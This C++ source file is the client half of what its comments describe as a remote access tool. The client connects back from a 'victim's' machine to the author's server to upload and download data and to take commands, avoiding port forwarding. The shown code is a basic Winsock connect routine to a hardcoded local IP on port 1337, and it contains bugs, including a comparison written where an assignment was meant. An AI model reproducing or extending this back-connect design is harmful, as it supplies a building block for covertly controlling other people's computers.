#include "Client.h"

/*
    This class is used to establish a connection
    to our server to upload/download data and receive
    commands.  We want the client to connect to us instead
    of us connecting to them in order to connect to computers
    behind routers.  This way we don't need to worry about
    forwarding any ports on the "victim's" end.
*/

Client::Client(void)
{
    /*
        NOTE: Obviously this is the local address of my server.
              The finished project will connect to a php server
              accessible from anywhere. For now if you want to run
              this server to accept connections you must compile the
              server project(Link to server sources) under linux
              because the server is coded using linux sockets not
              winsock.  Unless you want to add winsock to the server
              which is cool to.
    */
    PCSTR host = "192.168.1.86";
    PCSTR port = "1337";

    WSADATA wsaData;
    connectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

    if(iResult != 0)
    {
        printf("WSAStartup failed with error: %d\n", iResult);
        exit(1);
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(host, port, &hints, &result);

    if(iResult != 0 )
    {
        printf("getaddrinfo failed with error: %d\n", iResult);
    }

    for(ptr=result; ptr != NULL; ptr=ptr->ai_next)
    {
        connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if(connectSocket == INVALID_SOCKET)
        {
            printf("socket failed with error: %d\n", WSAGetLastError());
            WSACleanup();
            exit(1);
        }

        iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);

        if(iResult == SOCKET_ERROR)
        {
            closesocket(connectSocket);
            connectSocket == INVALID_SOCKET;
            printf("The server is down.  Can't connect\n");
        }
    }

    freeaddrinfo(result);

    if (connectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server.\n");
        WSACleanup();
        exit(1);
    }

    u_long iMode = 1;

    iResult = ioctlsocket(connectSocket, FIONBIO, &iMode);
    if(iResult == SOCKET_ERROR)
    {
        printf("ioctlsocket failed with error: %d\n", WSAGetLastError());
        closesocket(connectSocket);
        WSACleanup();
        exit(1);
    }

    char value = 1;
    setsockopt(connectSocket, IPPROTO_TCP, TCP_NODELAY, &value, sizeof(value));

}
